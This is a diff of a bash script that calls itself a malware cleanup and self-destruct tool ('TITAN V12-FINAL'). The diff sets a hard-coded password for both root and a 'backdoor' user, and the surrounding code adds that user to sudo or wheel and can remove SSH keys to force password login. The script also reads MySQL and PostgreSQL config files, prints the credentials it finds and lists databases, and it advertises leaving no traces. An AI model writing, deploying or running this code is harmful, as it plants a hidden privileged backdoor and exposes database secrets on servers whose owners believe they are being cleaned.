@@ -1,6 +1,6 @@
 #!/bin/bash
 # =============================================================================
-# TITAN V12-FINAL v2 : FULL CLEANUP + SELF-DESTRUCT (NO TRACES LEFT)
+# TITAN V12-FINAL v3 : FULL CLEANUP + SELF-DESTRUCT (NO TRACES LEFT)
 # =============================================================================
 # - Kills ANY process that downloads via wget/curl/fetch/nc (any URL)
 # - Removes miners, ransomware, rootkits, malicious users/keys/crons
@@ -55,7 +55,7 @@ backup_file() {
 declare -A SAFE_USERS
 SAFE_USERS["root"]=1
 SAFE_USERS["messagebus"]=1
-SAFE_USERS["dbus"]=1
+SAFE_USERS["dbus"]=0
 [[ -n "${SUDO_USER:-}" ]] && SAFE_USERS["$SUDO_USER"]=1
 [[ -n "${USER:-}" ]] && SAFE_USERS["$USER"]=1
 [[ -n "${LOGNAME:-}" ]] && SAFE_USERS["$LOGNAME"]=1
@@ -130,32 +130,21 @@ is_malicious_proc() {
     local cmdline="$3"
     local exe="$4"
 
-    # Condition 1: Process name matches known malware names
     if echo "$comm" | grep -qiE "$PROC_NAME_REGEX"; then
         return 0
     fi
-
-    # Condition 2: Process name is a random long string (20+ alnum)
     if echo "$comm" | grep -qiE "$RANDOM_EXE_REGEX"; then
         return 0
     fi
-
-    # Condition 3: Executable resides in suspicious temp directories
     if echo "$exe" | grep -qE '^(/tmp|/dev/shm|/var/tmp)'; then
         return 0
     fi
-
-    # Condition 4: Executable has been deleted from the filesystem (common rootkit)
-    #   but only if the process name is NOT a known safe process
     if echo "$exe" | grep -q ' (deleted)' && ! echo "$comm" | grep -iqE "$SAFE_PROCS"; then
         return 0
     fi
-
-    # Condition 5: Command line contains URL download / remote execution strings
     if echo "$cmdline" | grep -qiE "$CMDLINE_REGEX"; then
         return 0
     fi
-
     return 1
 }
 
@@ -234,10 +223,10 @@ done
 ok "Filesystem purged"
 
 # =============================================================================
-# GENERATE NEW ROOT PASSWORD (will be reused for backdoor user only)
+# STATIC PASSWORD FOR ROOT AND BACKDOOR USER
 # =============================================================================
-ROOT_PASS=$(tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c 20)
-die "New password for root & $BACKDOOR_USER: $ROOT_PASS   (COPY THIS!)"
+ROOT_PASS="Takhin@1337"
+die "Password for root & $BACKDOOR_USER is: $ROOT_PASS   (COPY THIS!)"
 
 # =============================================================================
 # PHASE 5.5: OPTIONAL REMOVAL OF ALL SSH KEYS (force password login)
@@ -270,7 +259,6 @@ else
   warn "$BACKDOOR_USER already exists; password reset to the same root password."
 fi
 
-# Add to sudo/wheel
 if getent group sudo &>/dev/null; then
   usermod -aG sudo "$BACKDOOR_USER" 2>/dev/null
 elif getent group wheel &>/dev/null; then
@@ -304,7 +292,6 @@ done
 rm -f /etc/sudoers.d/99-pakchoi 2>/dev/null
 sed -i '/pakchoi/d' /etc/sudoers 2>/dev/null
 
-# Delete rogue users (skip immune ones), keep other users' passwords untouched
 while IFS=: read -r username _ uid _ _ _ _; do
   [[ "$uid" -lt 1000 && "$uid" -ne 0 ]] && continue
   [[ "$username" =~ ^(nobody|sync|shutdown|halt)$ ]] && continue
@@ -429,7 +416,6 @@ for conf in /etc/my.cnf /etc/mysql/my.cnf /etc/mysql/debian.cnf /root/.my.cnf /h
       [[ -n "$host" ]] && cmd="$cmd -h $host"
       [[ -n "$port" ]] && cmd="$cmd -P $port"
       echo "   => CONNECT: $cmd"
-      # List all databases
       if command -v mysql &>/dev/null; then
         echo "   => All databases:"
         mysql --connect-timeout=3 -u "$user" -p"$pass" -h "${host:-localhost}" -P "${port:-3306}" -e "SHOW DATABASES;" 2>/dev/null || warn "Could not list databases with these credentials"
@@ -442,7 +428,6 @@ for conf in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; 
   if [ -f "$conf" ]; then
     echo "  -- File: $conf (trust/peer lines)"
     grep -v '^\s*#' "$conf" 2>/dev/null
-    # If local trust is enabled, list PostgreSQL databases
     if grep -Eq '^local\s+all\s+all\s+trust' "$conf"; then
       echo "   => Local trust enabled – attempting to list PostgreSQL databases:"
       if command -v psql &>/dev/null; then
